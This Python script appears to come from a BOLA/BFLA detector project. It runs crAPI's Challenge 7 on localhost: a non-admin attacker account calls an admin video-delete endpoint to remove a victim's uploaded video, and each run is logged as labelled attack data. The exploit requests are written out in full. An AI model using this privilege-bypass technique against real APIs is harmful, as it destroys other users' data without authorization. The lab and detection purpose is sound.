# services/bola-detector/attacks/bfla_delete_video.py
"""Attack run: BFLA (Challenge 7 crAPI) — 1 user thường (không phải admin) gọi
thẳng endpoint "admin" để xoá video của người khác. Endpoint thật xác nhận
qua source code identity service (ProfileController.deleteVideoBOLA — tên hàm
trong code chính là gợi ý BFLA/thiếu kiểm tra role):
    DELETE /identity/api/v2/admin/videos/{video_id}
So sánh với endpoint hợp lệ dành cho chủ sở hữu (có kiểm tra nhưng luôn trả 403
để gợi ý cho người chơi tìm endpoint admin ở trên):
    DELETE /identity/api/v2/user/videos/{video_id}
"""
import json
import time
import uuid

import requests

BASE = "http://localhost:8888"


def login(email: str, password: str) -> str:
    r = requests.post(
        f"{BASE}/identity/api/auth/login",
        json={"email": email, "password": password},
    )
    r.raise_for_status()
    return r.json()["token"]


def upload_dummy_video(token: str, file_bytes: bytes = b"\x00" * 1024) -> int:
    """Victim upload 1 video giả (chỉ cần đủ điều kiện để service lưu record).
    Trả về video_id."""
    r = requests.post(
        f"{BASE}/identity/api/v2/user/videos",
        headers={"Authorization": f"Bearer {token}"},
        files={"file": ("clip.mp4", file_bytes, "video/mp4")},
    )
    r.raise_for_status()
    return r.json()["id"]


def run_attack(attacker_token: str, victim_video_id: int, out_meta_path: str) -> str:
    attack_run_id = str(uuid.uuid4())
    headers = {
        "Authorization": f"Bearer {attacker_token}",
        "X-Attack-Run-Id": attack_run_id,
    }
    start = time.time()
    resp = requests.delete(
        f"{BASE}/identity/api/v2/admin/videos/{victim_video_id}", headers=headers
    )
    end = time.time()

    with open(out_meta_path, "a") as f:
        f.write(
            json.dumps(
                {
                    "attack_run_id": attack_run_id,
                    "attack_class": "BFLA",
                    "start_ts": start,
                    "end_ts": end,
                    "is_test_only_variant": False,
                }
            )
            + "\n"
        )
    return attack_run_id, resp.status_code, (resp.json() if resp.content else None)


if __name__ == "__main__":
    victim_token = login("victim@test.local", "Victim123@")
    attacker_token = login("attacker@test.local", "Attacker123@")

    video_id = upload_dummy_video(victim_token)
    print(f"victim uploaded video_id={video_id}")

    attack_run_id, status, body = run_attack(
        attacker_token, video_id, "attacks/attack_runs_meta.jsonl"
    )
    print(f"attack_run_id={attack_run_id}, DELETE status={status}, body={body}")
